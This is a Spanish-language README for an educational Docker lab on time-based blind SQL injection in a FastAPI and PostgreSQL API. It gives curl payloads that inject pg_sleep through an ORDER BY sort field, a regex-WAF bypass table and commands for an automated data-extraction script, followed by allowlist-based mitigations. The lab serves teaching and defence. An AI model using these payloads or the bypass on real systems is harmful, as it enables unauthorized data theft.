# 🔬 Blind SQL Injection Lab — Time-Based (PostgreSQL + FastAPI)

> **Laboratorio educativo de seguridad ofensiva y defensiva** para entender, explotar y mitigar vulnerabilidades de Blind SQL Injection basadas en tiempo. Diseñado con estándares modernos (2025/2026).

![License](https://img.shields.io/badge/license-MIT-blue)
![Python](https://img.shields.io/badge/python-3.12-blue)
![FastAPI](https://img.shields.io/badge/FastAPI-0.111-green)
![PostgreSQL](https://img.shields.io/badge/PostgreSQL-16-blue)
![Docker](https://img.shields.io/badge/Docker-Compose-informational)
![Category](https://img.shields.io/badge/category-Web%20Security-red)

---

## ⚠️ Aviso Legal / Legal Notice

> **Este laboratorio es exclusivamente educativo.** Todo el código vulnerable está diseñado para ejecutarse en un entorno local aislado mediante Docker. No utilices estas técnicas contra sistemas sin autorización explícita por escrito. El autor no se hace responsable del uso indebido.

---

## 📋 Descripción

Este laboratorio simula un escenario realista de **Blind SQL Injection por tiempo (Time-Based)** en una API moderna de analítica. A diferencia de los típicos formularios de login, la vulnerabilidad está en un endpoint de analítica con filtrado JSON que usa un ORM (SQLAlchemy) de forma parcialmente incorrecta.

### ¿Qué aprenderás?

- Identificar anomalías de tiempo de respuesta que revelan inyecciones ciegas
- Entender por qué un código que "parece seguro" puede ser vulnerable
- Evadir un WAF simple basado en regex usando técnicas de bypass
- Extraer datos de una base de datos carácter a carácter de forma automatizada
- Aplicar las mitigaciones correctas: allowlists + Pydantic + Prepared Statements

---

## 🏗️ Arquitectura

```
┌─────────────────────────────────────────────────┐
│                  Docker Network                  │
│                                                  │
│  ┌──────────────────┐    ┌──────────────────┐   │
│  │  FastAPI (Python) │    │  PostgreSQL 16   │   │
│  │  :8000           │───▶│  analyticsdb     │   │
│  │  main.py         │    │                  │   │
│  │  [VULNERABLE]    │    │  products        │   │
│  └──────────────────┘    │  analytics_events│   │
│                          │  internal_config │   │
│                          └──────────────────┘   │
└─────────────────────────────────────────────────┘
```

**Endpoint vulnerable:** `POST /api/v1/analytics/events`  
**Vector de ataque:** Inyección en cláusula `ORDER BY` dinámica  
**Técnica:** Time-Based Blind SQLi con `pg_sleep()` + `CASE WHEN`

---

## 📁 Estructura del repositorio

```
blind-sqli-lab/
├── docker-compose.yml          # Orquestación de servicios
├── db/
│   └── init.sql                # Schema + datos de prueba + "flag"
├── api/
│   ├── Dockerfile
│   ├── requirements.txt
│   ├── main.py                 # ← Versión VULNERABLE (comentada y explicada)
│   └── main_secure.py          # ← Versión PARCHEADA con mitigaciones
└── exploit/
    └── exploit.py              # Script de extracción automatizada
```

---

## 🚀 Despliegue rápido

### Prerrequisitos

- Docker Desktop (o Docker Engine + Compose plugin)
- Python 3.10+ (solo para el script de exploit)

### 1. Clonar el repositorio

```bash
git clone https://github.com/TU_USUARIO/blind-sqli-lab.git
cd blind-sqli-lab
```

### 2. Levantar el entorno

```bash
docker compose up --build -d
```

### 3. Verificar que la API está activa

```bash
curl http://localhost:8000/health
# {"status":"ok","version":"2.1.0"}

# Swagger UI (documentación interactiva)
open http://localhost:8000/docs
```

---

## 🔴 Guía de explotación

### Paso 1 — Reconocimiento por tiempo

```bash
# Baseline: respuesta normal (~40ms)
curl -s -w "\nTiempo: %{time_total}s\n" \
  -X POST http://localhost:8000/api/v1/analytics/events \
  -H "Content-Type: application/json" \
  -d '{"sort_by": "occurred_at", "limit": 5}'

# Sondeo: condición TRUE → debe tardar ~3 segundos
curl -s -w "\nTiempo: %{time_total}s\n" \
  -X POST http://localhost:8000/api/v1/analytics/events \
  -H "Content-Type: application/json" \
  -d '{"sort_by": "CASE WHEN (1=1) THEN (pg_sleep(3) IS NOT NULL)::int ELSE id END"}'

# Confirmación: condición FALSE → respuesta rápida
curl -s -w "\nTiempo: %{time_total}s\n" \
  -X POST http://localhost:8000/api/v1/analytics/events \
  -H "Content-Type: application/json" \
  -d '{"sort_by": "CASE WHEN (1=2) THEN (pg_sleep(3) IS NOT NULL)::int ELSE id END"}'
```

### Paso 2 — Extracción automatizada

```bash
cd exploit/
pip install requests

# Verificar que el oráculo funciona
python3 exploit.py --verify

# Extraer la versión de PostgreSQL
python3 exploit.py --extract version

# Extraer el usuario de la base de datos
python3 exploit.py --extract user

# Extraer el nombre del schema
python3 exploit.py --extract schema

# Extraer el FLAG secreto
python3 exploit.py --extract flag
```

### Bypass del WAF

El endpoint incluye un mini-WAF que bloquea palabras como `SELECT`, `UNION`, `DROP`, etc. Los payloads de este lab usan `pg_sleep()` dentro de una expresión `CASE WHEN` — ninguna de estas palabras está en la lista negra.

| Payload | WAF | Motivo |
|---|---|---|
| `SELECT version()` | ❌ Bloqueado | `\bselect\b` en la regex |
| `UNION SELECT ...` | ❌ Bloqueado | `\bunion\b` en la regex |
| `pg_sleep(3)` | ✅ Pasa | No está en la lista |
| `CASE WHEN ... pg_sleep` | ✅ Pasa | Ninguna palabra bloqueada |

---

## 🟢 Mitigación y parche

El archivo `api/main_secure.py` implementa las correcciones. Los cambios clave:

### 1. Allowlist explícita en Pydantic (más importante)

```python
ALLOWED_SORT_COLUMNS = {
    "occurred_at", "event_type", "country",
    "product_name", "category", "sku"
}

@field_validator("sort_by")
@classmethod
def validate_sort_by(cls, v):
    if v and v not in ALLOWED_SORT_COLUMNS:
        raise ValueError(f"Invalid sort column '{v}'")
    return v
```

### 2. Guard clause antes de la query

```python
if sort_column not in ALLOWED_SORT_COLUMNS:
    raise HTTPException(status_code=422, detail="Invalid sort column")
```

### Activar la versión segura

```bash
# Editar docker-compose.yml y cambiar el CMD, o:
docker compose exec api uvicorn main_secure:app --host 0.0.0.0 --port 8000
```

### Por qué un WAF regex NO es suficiente

Un WAF puede ser una capa adicional, nunca la defensa primaria. El atacante solo necesita conocer una función de base de datos que no esté en la lista (`pg_sleep`, `pg_read_file`, `dblink`, etc.). La defensa correcta es estructural: **rechazar todo lo que no esté explícitamente permitido**.

---

## 🛡️ Capas de defensa recomendadas

| Capa | Técnica | Implementada en |
|---|---|---|
| **Validación de entrada** | Allowlist en Pydantic | `main_secure.py` |
| **Guard clause** | Doble validación antes de la query | `main_secure.py` |
| **Parámetros bind** | `:param` en todos los filtros WHERE | Ambas versiones |
| **Principio mínimo privilegio** | `appuser` sin acceso a tablas internas | `init.sql` (mejora pendiente) |
| **Logging y alertas** | Detectar respuestas lentas inusuales | No implementado (ejercicio) |

---

## 📚 Conceptos cubiertos

- **CWE-89** — Improper Neutralization of Special Elements in SQL Commands
- **OWASP A03:2021** — Injection
- **Blind SQL Injection** (Time-Based vs Boolean-Based)
- **ORDER BY Injection** — vector frecuentemente ignorado en revisiones de código
- **WAF bypass** — por qué los filtros regex son insuficientes
- **Defense in Depth** — múltiples capas de validación independientes
